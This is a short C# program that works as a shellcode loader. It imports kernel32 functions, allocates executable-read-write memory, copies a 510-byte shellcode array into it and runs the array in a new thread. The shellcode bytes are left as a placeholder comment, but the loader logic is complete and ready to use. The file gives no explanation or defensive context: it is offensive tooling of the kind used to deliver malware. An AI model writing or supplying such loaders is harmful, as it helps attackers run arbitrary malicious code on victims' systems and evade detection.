using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static void Main(string[] args)
    {
       byte[] buf = new byte[510] { /* ... Shellcode ... */ };

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x1000, 0x40);
        Marshal.Copy(buf, 0, addr, buf.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
